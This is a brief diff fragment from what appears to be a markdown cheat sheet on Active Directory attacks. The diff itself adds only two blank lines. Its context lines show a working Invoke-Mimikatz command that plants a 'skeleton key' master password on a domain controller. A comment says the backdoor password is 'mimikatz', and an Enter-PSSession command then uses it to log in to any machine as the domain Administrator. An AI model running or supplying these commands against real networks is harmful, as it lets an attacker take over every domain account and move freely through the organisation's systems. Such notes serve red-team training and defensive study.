@@ -19,3 +19,5 @@ Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC
 # Access using the password "mimikatz"
 Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
 ```
+
+
